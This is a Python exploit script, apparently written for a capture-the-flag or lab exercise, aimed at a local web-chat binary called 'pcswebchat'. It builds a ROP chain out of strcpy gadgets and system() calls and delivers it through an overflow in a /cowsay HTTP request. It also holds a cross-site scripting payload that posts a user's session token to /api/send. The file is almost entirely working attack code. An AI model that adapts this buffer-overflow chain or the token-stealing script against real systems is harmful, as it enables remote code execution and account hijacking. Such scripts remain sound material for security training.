#!/usr/bin/env python
from pwn import *
import requests, json
import time
import random, string, socket
from socket import AF_INET, SOCK_STREAM

HOST='http://127.0.0.1:8080'

login_data = { 'username' : 'pcs', 'password' : 'princess' }

webexploit = '''$.ajax({type: "POST",url: "/api/send",data:{msg:"token:" + token,len:token.length,token:token},success: function(resp){}})'''

#requests.post(HOST + '/api/signup', data = login_data ).text
#token = json.loads(requests.post(HOST + '/api/login', data = login_data ).text)['token']

context(arch='i386', os='linux')

def cowsay(msg,socket):
	msg = "/cowsay?msg=" + msg
	toHttp(msg,"GET",socket)

def toHttp(string,HTTPtype,socket):
	string = HTTPtype + " " + string + " HTTP/1.1\r\n\r\n"
	socket.send(string)

def recvuntil(sock, stop):
    s = ''
    while True:
        c = sock.recv(1)
        if c == 0:
            raise Exception('Connection closed by server')
        if c == stop:
            return s
        s += c

def recvline(sock):
    return recvuntil(sock, '\n')

def sendline(sock, line):
    line = line + '\n'
    n = 0
    while n < len(line):
        n += sock.send(line[n:])

def toROP(elf,string,start):
    exploit = ""
    for i,char in enumerate(string):
        current = elf.search(char + "\x00")
        succesful = False
        result = ""
        for chars in current:
            chars = p32(chars)
            if "\x00" in chars:
                continue

            result = chars
            succesful = True
            break
        if not succesful:
            raise Exception("could not find path to " + char)
        exploit += strcpy + pop2ret + p32(start+i) + result
    return exploit


bss = 0x08050c00
system = p32(0x08048cb0)
exit = p32(0x08048e80)
strcpy = p32(0x08048c90)
pop2ret = p32(0x804ccd9)
elf = ELF("pcswebchat")

exploit = "".rjust(0x1F3,"A")
exploit += toROP(elf,"/bin/ls",bss + 1)
exploit += system + exit + p32(bss+1)


sock = socket.socket(AF_INET, SOCK_STREAM, 0)
sock.connect(('127.0.0.1', 8080))
# Initial handshake


cowsay(exploit,sock)
while True:
	line = sock.recv(2024)
	print line
	if line == "" or line == "\x00":
		break





	
res = sock.close()


	